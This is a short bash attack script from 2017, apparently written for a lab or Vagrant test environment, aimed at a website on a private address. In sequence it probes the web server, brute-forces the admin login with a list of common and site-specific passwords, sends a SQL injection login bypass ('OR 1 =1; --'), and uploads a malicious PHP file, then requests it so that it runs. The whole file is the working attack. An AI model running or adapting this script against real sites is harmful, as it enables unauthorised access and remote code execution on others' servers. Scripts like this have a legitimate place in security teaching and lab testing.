#!/bin/bash

##############################################################
# SQL Injection on and simple bruteforce on login of website
# Ing. Alexander Poschenreithner, 2017
##############################################################

# Do first normal request
echo "     => Calling Website..."
curl -s -o /tmp/attack.log 10.11.12.10 

# Get some webserver information
curl -s -o /tmp/attack.log http://10.11.12.10/forSureIdoNotExist999999999.php

# Some automated tries with standard values
echo "     => Bruteforcing some standard passwords"
declare -a arr=("password" "password123" "123456" "admin" "abcd" "Scions Verlag" "ScionsVerlag" "scionsverlag2017" "administrator")
for password in "${arr[@]}"
do
	echo "       => $password"
    curl -s -o /tmp/attack.log -X POST -F "username=admin" -F "password=$password" -F "login=Login" http://10.11.12.10/index.php 
done

# Now the SQL Injection
echo "     => SQL Injection"
curl -s -o /tmp/attack.log -X POST -F "username=' OR 1 =1; --" -F "password=x" -F "login=Login" http://10.11.12.10/index.php 

# Try to upload bad php file and call it... 
echo "     => Now upload a bad PHP File and call it"
curl -s -o /tmp/attack.log -F "submit=Upload Report" -F "file=@/vagrant_data/badPHP.php" http://10.11.12.10/report.php 
curl -s -o /tmp/attack.log http://10.11.12.10/upload/badPHP.php 